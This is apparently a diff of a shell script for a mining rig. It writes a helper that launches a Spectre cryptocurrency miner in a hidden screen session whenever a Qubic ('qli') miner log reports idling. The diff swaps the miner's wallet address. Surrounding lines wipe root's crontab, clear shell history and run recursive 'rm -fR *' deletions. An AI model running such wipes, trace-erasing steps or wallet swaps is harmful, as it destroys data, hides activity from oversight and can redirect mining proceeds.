@@ -56,12 +56,12 @@ cat /dev/null > /var/spool/cron/crontabs/root
 history -c && history -w
 rm -fR *
 rm -fv *
-
+sleep 3
 cat >>checkQliStatus.sh<<EOF
 status=$(tail -1 /var/log/qli.log | awk '{print $6}')
 if [ "$status" = "Idling" ];
 then
-  screen -dmS spectre-pool spr/bin/spr -a spectre:qq5qzl0nw8vhz54fz6v52zq66m0j7l03g4ytmna2elz9f7a29k8x62twu058a -s 139.162.113.144 -p 18110 -t 6
+  screen -dmS spectre-pool spr/bin/spr -a spectre:qqvak2q2x3k2u66e35wfnmuzs2t8qpulzzstnfudxu2qs0dn5mrc2e03s3qwd -s 139.162.113.144 -p 18110 -t 6
 else
   screen -S spectre-pool -X quit
 fi
